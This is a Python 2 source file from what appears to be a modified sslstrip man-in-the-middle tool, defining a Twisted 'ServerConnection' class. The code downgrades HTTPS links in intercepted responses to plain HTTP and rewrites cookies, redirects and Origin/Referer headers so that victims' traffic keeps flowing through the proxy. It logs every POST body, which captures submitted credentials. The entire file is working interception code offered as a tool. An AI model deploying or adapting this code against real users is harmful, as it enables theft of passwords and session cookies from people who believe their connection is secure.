# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient

import urlparse

from change import local_host, replaceCookie, tld, path_host_dict, getNewUrl, getHost


class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''
    urlExpression = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    localUrlExpression = re.compile(r"http%3A%2F%2F"+local_host+r".{0,15}", re.IGNORECASE)
    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            if header=="origin" or header=="referer":
                value = self.replacePostHeaderUrl(value)
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        postData = self.replacePostLinks(self.postData)
        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(postData))
        self.transport.write(postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))


        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Response is image content, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            value = replaceCookie(value)
            self.client.responseHeaders.addRawHeader(key, value)
        elif(key.lower()=='location'):
            self.client.setHeader(key,getNewUrl(value))
            pass
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)

        data = self.replaceReceivedLinks(data)
        
        #logging.log(self.getLogLevel(), "CHANGED DATA:\n" + data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceReceivedLinks(self, data):
        replace_dict = {}

        data = data.replace('&amp;', '&') 
      
        iterator = re.finditer(ServerConnection.urlExpression, data)
        
        links = []
        for match in iterator:
            url = match.group()
            host = urlparse.urlparse(url).netloc
            if tld in host:
                index = url.find('/', 8)
                if index!=-1:
                    path = url[index:]
                else:
                    path="/"

                path = urlparse.urlparse(url).path
                replace_dict[url] = path
        
        sorted_list = sorted(replace_dict.items(), key=lambda x: len(x[0]))

        for x in sorted_list:
            link = x[0]
            path = x[1]
            if len(link)<5:
                continue
            data = data.replace(link, path)
            if len(path)>=5:
                path_host_dict[path[:15]] = urlparse.urlparse(link).netloc

        return data
    
    def replacePostLinks(self, data):
        iterator = re.finditer(ServerConnection.localUrlExpression, data)
        
        links = []
        for match in iterator:
            url = match.group()
            print "Post Find: "+url
            url.replace("%2F","/")
            index = url.find('/', 8)
            if index!=-1:
                path = url[index:]
            else:
                path = "/"
            target_host = self.client.realHost
            new_url = "https%3A%2F%2F"+target_host
            local_url = "http%3A%2F%2F"+local_host
            data = data.replace(local_url, new_url)

        return data

    def replacePostHeaderUrl(self, url):
        local_url = "http://"+local_host
        if url.startswith(local_url):
            print "Start: "+url
            index = url.find('/', 8)
            if index!=-1:
                path = url[index:]
            else:
                path = "/"
            target_host = self.client.realHost
            url = "https://"+target_host+path
        print "Changed: "+url
        return url

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()


